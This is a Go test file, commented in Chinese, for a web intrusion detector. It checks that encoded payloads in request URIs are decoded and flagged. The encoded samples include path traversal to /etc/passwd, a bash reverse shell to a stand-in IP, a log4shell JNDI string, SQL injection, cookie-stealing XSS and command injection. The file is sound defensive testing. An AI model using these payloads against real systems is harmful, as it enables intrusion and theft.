package detect

import (
	"strings"
	"testing"

	"netsa/internal/model"
)

// 编码载荷还原的验收：Base64 / Hex 编码的穿越、命令执行、表达式注入载荷与路径中用 + 代替空格的注入能识别；
// 正常请求中的 Base64（JWT、回跳网址、普通文字）、哈希值、带哈希的静态资源名不误报。
func TestDecodedPayloads(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	inspect := func(uri string) []model.Hit {
		return e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Host: "a.example.com", Method: "GET", URI: uri, Status: 404, Bytes: 100, UA: "Mozilla/5.0"})
	}
	for uri, want := range map[string]string{
		"/download/Li4vLi4vLi4vZXRjL3Bhc3N3ZA==":                                "trav-dotdot",   // ../../../etc/passwd
		"/download?file=Li4vLi4vLi4vZXRjL3Bhc3N3ZA%3D%3D":                       "trav-dotdot",   // 填充经过 URL 编码
		"/view?f=Li4vLi4vLi4vd2luZG93cy93aW4uaW5p":                              "lfi-sensitive", // ../../../windows/win.ini
		"/api/run?c=YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ%3D%3D": "cmd-shell",     // bash -i >& /dev/tcp/…
		"/read?file=2e2e2f2e2e2f2e2e2f6574632f706173737764":                     "trav-dotdot",   // Hex
		"/read?file=0x2e2e2f2e2e2f2e2e2f6574632f706173737764":                   "trav-dotdot",   // Hex，带 0x
		"/x?u=JHtqbmRpOmxkYXA6Ly8xLjIuMy40OjEzODkvYX0=":                         "log4shell",     // ${jndi:ldap://…}
		"/p/eyJ1c2VyIjoiYWRtaW4nIE9SICcxJz0nMSJ9":                               "sqli-bool",     // {"user":"admin' OR '1'='1"}
		"/x?data=PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ-":          "xss-script",    // URL 安全字母表
		"/cgi-bin/test.cgi;cat+/etc/passwd":                                     "cmd-inject",    // 路径中的 +
		"/index.php/1+union+select+1,2,user()":                                  "sqli-union",
	} {
		hits := inspect(uri)
		found := false
		for _, h := range hits {
			if h.RuleID == want {
				found = true
				if !strings.Contains(h.Evidence, "解码后") && !strings.Contains(uri, "+") {
					t.Errorf("%s：证据应注明解码方式: %s", uri, h.Evidence)
				}
			}
		}
		if !found {
			t.Errorf("%s 应识别为 %s: %+v", uri, want, hits)
		}
	}
	// 参数名记入命中，供自学习按参数复核
	for _, h := range inspect("/download?file=Li4vLi4vLi4vZXRjL3Bhc3N3ZA==") {
		if h.RuleID == "trav-dotdot" && (h.Param != "file" || !strings.Contains(h.Evidence, "参数 file")) {
			t.Errorf("应记录参数名: %+v", h)
		}
	}
	for _, uri := range []string{
		"/api/v1/me?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
		"/login?return=aHR0cHM6Ly93d3cuZXhhbXBsZS5jb20vYWNjb3VudC9vcmRlcnM%3D",            // https://www.example.com/account/orders（回跳网址）
		"/redirect?to=aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRh",               // 回跳网址中的元数据地址：SSRF 不采信解码结果
		"/static/img/aGVsbG8gd29ybGQgdGhpcyBpcyBmaW5l.png",                                // hello world this is fine
		"/assets/app.3f9a2b7c1d4e5f6071829304a5b6c7d8.js",                                 // 带哈希的资源名
		"/files/8f14e45fceea167a5a36dedd4abac8f6/report.pdf",                              // MD5
		"/track?gclid=Cj0KCQjw3ZayBhDRARIsAPWzx8oL1qmQ9dZ8b7fS3uRk0vT2xYhZs1aAg8EALw_wcB", // 广告点击 ID
		"/api/items?cursor=eyJpZCI6MTIzNDUsInRzIjoxNzAwMDAwMDAwfQ",                        // {"id":12345,"ts":1700000000}
		"/wiki/AbstractSingletonProxyFactoryBean",                                         // 普通单词
		"/search?q=d2hlcmUgaXMgdGhlIGJlc3QgY29mZmVl",                                      // where is the best coffee
		"/products/2026+spring+collection",                                                // 路径中的 + 只是空格
		"/blog/c%2B%2B-and-go+tips",
	} {
		for _, h := range inspect(uri) {
			if !h.TagOnly && h.Category != CatAutomation {
				t.Errorf("%s 不应告警: %+v", uri, h)
			}
		}
	}
}

func TestDecodePieceLimits(t *testing.T) {
	if _, ok := decodeBase64("YWJj"); ok {
		t.Error("过短的片段不解码")
	}
	if _, ok := decodeBase64(strings.Repeat("QUFB", 4) + "==" + "="); ok {
		t.Error("填充超过 2 个不是 Base64")
	}
	if _, ok := decodeBase64("Li4vLi4vLi4v-ZXRj/L3Bhc3N3ZA"); ok {
		t.Error("两种字母表混用不是 Base64")
	}
	if _, ok := decodeHex("2e2e2f2e2e2f2e2e2f6574632f70617373776"); ok {
		t.Error("奇数长度不是 Hex")
	}
	if _, ok := printableText([]byte{0x2e, 0x2e, 0x2f, 0x00, 0x01, 0x2f, 0x2e, 0x2e, 0x2f}); ok {
		t.Error("含控制字符的不是文本")
	}
	if _, ok := printableText([]byte("plainwordsonly")); ok {
		t.Error("没有攻击符号的文本不再匹配")
	}
	long := "/x?" + strings.Repeat("a=Li4vLi4vLi4vZXRjL3Bhc3N3ZA==&", 20)
	if n := len(encodedPieces(long)); n != maxPieces {
		t.Errorf("每个请求最多解码 %d 个片段: %d", maxPieces, n)
	}
}

// 正常请求（含 JWT、广告点击 ID、哈希资源名等候选片段）的检测耗时：decode 子项为解码部分的耗时，
// 与 inspect（完整检测）相比即为额外开销。
func BenchmarkDecodeOverhead(b *testing.B) {
	e, _ := NewEngine("", 1)
	uris := []string{
		"/products/1024?ref=home",
		"/api/v1/me?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
		"/track?gclid=Cj0KCQjw3ZayBhDRARIsAPWzx8oL1qmQ9dZ8b7fS3uRk0vT2xYhZs1aAg8EALw_wcB&utm_source=google&utm_medium=cpc",
		"/assets/app.3f9a2b7c1d4e5f6071829304a5b6c7d8.js",
		"/files/8f14e45fceea167a5a36dedd4abac8f6/report.pdf",
		"/api/items?cursor=eyJpZCI6MTIzNDUsInRzIjoxNzAwMDAwMDAwfQ&limit=20",
		"/news/2026/10/22/world-cup-final-highlights",
		"/search?q=router+firmware+update",
	}
	evs := make([]*model.Event, len(uris))
	for i, u := range uris {
		evs[i] = &model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Host: "a.example.com", Method: "GET", URI: u, Status: 200, Bytes: 5000, UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
	}
	b.Run("inspect", func(b *testing.B) {
		b.ReportAllocs()
		for i := 0; i < b.N; i++ {
			e.Inspect(evs[i%len(evs)])
		}
	})
	b.Run("decode", func(b *testing.B) {
		b.ReportAllocs()
		for i := 0; i < b.N; i++ {
			e.decodedHits(evs[i%len(evs)], model.ResultSuccess, nil)
		}
	})
}

// 先放一批无害的编码片段凑满上限、再放真正的载荷：无害片段不计入上限。
func TestDecodePaddingEvasion(t *testing.T) {
	e, _ := NewEngine("", 1)
	uri := "/x?" + strings.Repeat("a=aGVsbG8gd29ybGQgdGhpcyBpcyBmaW5l&", 12) + "f=Li4vLi4vLi4vZXRjL3Bhc3N3ZA=="
	found := false
	for _, h := range e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Method: "GET", URI: uri, Status: 404, UA: "Mozilla/5.0"}) {
		found = found || h.RuleID == "trav-dotdot"
	}
	if !found {
		t.Fatal("无害片段不应把载荷挤出解码上限")
	}
}

// 典型的正常访问（大多数请求没有候选片段，约一成带令牌、游标）：解码部分占完整检测的耗时。
func BenchmarkDecodeTypical(b *testing.B) {
	e, _ := NewEngine("", 1)
	uris := []string{"/", "/index.html", "/about", "/products", "/products/1024", "/news/2026/10/22", "/static/js/app.js",
		"/static/css/main.css", "/api/v1/user/profile", "/api/v1/orders?page=2", "/search?q=router", "/login", "/favicon.ico",
		"/images/banner.jpg", "/wp-content/themes/main/style.css", "/actuator/health", "/admin/index.php",
		"/api/v1/cart?sku=AB-1029&qty=2", "/assets/app.3f9a2b7c1d4e5f6071829304a5b6c7d8.js",
		"/api/items?cursor=eyJpZCI6MTIzNDUsInRzIjoxNzAwMDAwMDAwfQ&limit=20"}
	evs := make([]*model.Event, len(uris))
	for i, u := range uris {
		evs[i] = &model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Host: "a.example.com", Method: "GET", URI: u, Status: 200, Bytes: 5000, UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
	}
	b.Run("inspect", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			e.Inspect(evs[i%len(evs)])
		}
	})
	b.Run("decode", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			e.decodedHits(evs[i%len(evs)], model.ResultSuccess, nil)
		}
	})
}
